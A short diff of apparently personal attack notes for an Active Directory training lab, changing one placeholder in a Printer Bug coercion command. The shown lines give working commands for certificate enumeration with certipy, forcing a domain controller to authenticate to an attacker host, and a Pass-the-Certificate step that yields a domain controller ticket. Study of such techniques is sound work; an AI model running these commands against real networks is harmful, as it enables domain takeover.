@@ -293,7 +293,7 @@ dir \\dc01\julio
     certipy find -u <user> -p <pass> -dc-ip <ip>
   # attcker wait the victime to auth to his \\ATTACKER\SHARE or:
      # Force DC01$ to auth back to attacker using Printer Bug
-     python3 printerbug.py INLANEFREIGHT.LOCAL/<CA01_USER>:"PASS"@<DC01-ip> <ATTACKER-ip> #=>  ./DC01$.pfx (get get the computer account(dc01$) cert)
+     python3 printerbug.py INLANEFREIGHT.LOCAL/<ANY_Domain_USER>:"PASS"@<DC01-ip> <ATTACKER-ip> #=>  ./DC01$.pfx (get get the computer account(dc01$) cert)
 
 ## Pass-the-Certificate attack to obtain a TGT as DC01$
   python3 gettgtpkinit.py -cert-pfx ./DC01$.pfx -dc-ip <DC01-IP> 'inlanefreight.local/dc01$' /tmp/dc.ccache # -> DC01 TGT
